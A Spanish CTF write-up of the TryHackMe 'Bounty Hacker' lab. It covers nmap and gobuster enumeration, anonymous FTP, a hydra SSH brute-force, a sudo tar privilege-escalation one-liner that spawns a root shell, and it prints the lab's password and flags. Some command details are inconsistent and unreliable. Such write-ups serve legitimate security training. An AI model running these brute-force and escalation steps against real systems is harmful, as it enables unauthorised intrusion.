---
title: TryHackMe-BountyHacker
---
<dt>WriteUp-CTF</dt>
<dd>Valente2023intuicion</dd>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>

# [](#header-1)1).Estructura del entorno de trabajo... 

* Maquina victima desplegada por tryhackmee 10.10.4.103.
![imagen](/images/Bounty_Hacker/1.png)  

* Maquina atacante 192.168.1.77
![imagen](/images/Bounty_Hacker/neofetch.png)

`Para establecer la comunicacion es nesesario conectarnos a la vpn proporcionada por tryhackmee con la herramienta openvpn`

![imagen](/images/Bounty_Hacker/openvpn.png)

<dt>OpenVPN</dt>
<dd>software de código abierto que permite crear y gestionar conexiones VPN seguras y cifradas a través de internet.</dd>

```js
#sudo openvpn eduardolazaro.ovpn

El archivo puede incluir información como la dirección IP del servidor VPN, el protocolo de conexión, el puerto utilizado y las credenciales de autenticación necesarias para acceder al servidor. Al utilizar el comando "openvpn" con este archivo de configuración, se establecerá una conexión VPN segura y cifrada con el servidor remoto.
```
![imagen](/images/Bounty_Hacker/ping.png)

`Por las trazas TTL=63  podemos presumir que nos estamos enfrentando a una maquina linux.`

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>

# [](#header-1)2).Descubrimiento y enumeracion de puertos con nmap... 

`Realizamos un escaneo sencillo a la ip con nmap`

```js
#sudo nmap -n 10.10.60.74 -oG allports
```

![imagen](/images/Bounty_Hacker/nmapallports.png)

| PORT         | STATE             |SERVICE|
|:-------------|:------------------|:------|
| 21/TCP       | open              | ftp   |
| 22/TCP       | Open              | ssh   |
| 80/TCP       | Open              | http  |

`Con algunos parametros diferentes de la herramienta nmap podemos llegar a profundisar mas.`

```js
#sudo nmap -sC -sV 10.10.60.74 -oG allports
"-sC": Utiliza los scripts de Nmap más comunes para buscar vulnerabilidades en los servicios que se encuentran en los puertos abiertos.
"-sV": Detecta la versión de los servicios que se ejecutan en los puertos abiertos.
"-oG allports": Genera una salida en formato "grepable" que se puede utilizar para filtrar los resultados y extraer información específica.
```
![imagen](/images/Bounty_Hacker/nmaptargeted.png)

`Esto nos arrojo la siguiente informacion`

<dt>ftp-anon: Anonymous FTP login allowed (FTP code 230)</dt>
<dd>La conexión anónima es un tipo de autenticación que permite acceder a  un servidor FTP sin proporcionar un nombre de usuario y una contraseña.  En lugar de ello, el cliente se conecta con un nombre de usuario y una  contraseña predeterminados, comúnmente Anonymous. </dd>

```js
#{ftp 10.10.60.74} {Anonymous}
```

`login exitoso.`

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)3).Ataques de fuerza bruta con diccionarios 

`listando con "ls" nos encontramos con dos archivos que procederemos a descargar a nuestra maquina. con el comando get`
 - locks.txt
 - task.txt

![imagen](/images/Bounty_Hacker/get.png)

`vizualizamos el contenido de los 2 .txt con "cat"`

![imagen](/images/Bounty_Hacker/cattask.png)
- Clara referencia a el anime Cowboy beboop y posible nombre de usuario "lin".

![imagen](/images/Bounty_Hacker/catlocks.png)
- Posible lista de contraseñas para la sesion ssh.

`Antes de realizar un ataque con congunto de palabras optenidas,Verermos que clase de servicio esta desplegando en el puerto 80 y una posterior enumeracion de directorios con gobuster`

![imagen](/images/Bounty_Hacker/web.png)

<dt>GoBuster</dt>

<dd>Herramienta de línea de comandos desarrollada en Go que se utiliza para encontrar
archivos y directorios ocultos en un servidor web. GoBuster realiza un ataque de fuerza bruta en el servidor web,
lo que significa que intenta adivinar nombres de archivos y directorios mediante la combinación de palabras de un diccionario.</dd>

```js
#sudo gobuster -u http://10.10.60.74 -w /home/valente/Documentos/diccionarios/SecList/Discovery/web-Content/common.txt
"-u" http://10.10.60.74" especifica la URL del sitio web que se va a analizar.
"-w" indica el archivo de diccionario que se utilizará para realizar la enumeración. En este caso, el archivo "common.txt" 
```

![imagen](/images/Bounty_Hacker/gobusterdir.png)

`Resultado exitoso`

- 10.10.60.74/images/

![imagen](/images/Bounty_Hacker/images.png)

- crew.jpg

![imagen](/images/Bounty_Hacker/crew.jpg)

`Con ayuda de la herramienta hydra intentaremos ataques de fuerza burta intentrando entrar al servidor SSH de la maquina victima con el diccionario "locks.txt"`

<dt>Hydra</dt>
<dd>Herramienta de prueba de penetración (penetration testing) utilizada para realizar ataques de fuerza bruta a servicios de autenticación y protocolos de red. La herramienta es capaz de realizar ataques de fuerza bruta contra diferentes tipos de sistemas, incluyendo FTP, SSH, Telnet, SMTP, HTTP, POP3 y otros.</dd>

```js
#hydra -l lin -p locks.txt 10.10.60.74 -t 4 ssh
El comando se utiliza para realizar un ataque de fuerza bruta a un servidor SSH en la dirección IP 10.10.4.103. Aquí está la descripción de los argumentos utilizados en el comando: 

-l lin: Especifica el nombre de usuario "lin" que se utilizará en el ataque.

-p look.txt: Especifica el archivo "look.txt" que contiene una lista de contraseñas que se usarán en el ataque.

10.10.4.103: Especifica la dirección IP del servidor SSH que se atacará.

-t 4: Especifica el número de hilos (4) que se utilizarán en el ataque.
```

![imagen](/images/Bounty_Hacker/hydra.png)

`Arrojandonos un resultado exitoso encontrando una contraseña valida para el usuario lin al cual nos procederemos a conectar con la contraseña correcta.`

```js
#ssh lin@10.10.60.74
RedDr4gonSynd1vat3
```

![imagen](/images/Bounty_Hacker/lin.png)

`y con esto la primera flag de usuario.`

![imagen](/images/Bounty_Hacker/flaguser.png)

- Flag_User.txt THM{CR1m3_SyNd1C4T3} 

![imagen](/images/Bounty_Hacker/roottxt.png)

```js
#sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
Este comando utiliza el programa tar para crear un archivo de archivos, pero en lugar
de crear un archivo real, se está creando un archivo virtual que se redirige a /dev/null. 
/dev/null es un archivo especial en Unix y Linux que descarta todos los datos que se escriben en él,
lo que significa que no se guardará ningún archivo real. 
Sin embargo, el propósito real de este comando es establecer un punto de control mediante
el uso de las opciones --checkpoint y --checkpoint-action. La opción 
--checkpoint especifica la frecuencia con la que se deben mostrar 
los mensajes de punto de control y la opción --checkpoint-action 
especifica la acción que se debe ejecutar en cada punto de control.
En este caso, la acción de punto de control específica es exec=/bin/sh, 
lo que significa que se ejecutará una shell cada vez que se alcance un punto de control.
Es importante tener en cuenta que esta acción de punto de control se ejecuta con 
los permisos del usuario root, lo que significa que cualquier usuario que tenga acceso a
ejecutar este comando puede obtener acceso de root en el sistema. 
Por lo tanto, es importante tener mucho cuidado al usar este comando y solo usarlo 
si se entienden las implicaciones y se considera que es necesario.
```
- Flag_root.txt THM{80un7y_H4ck3r 

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>
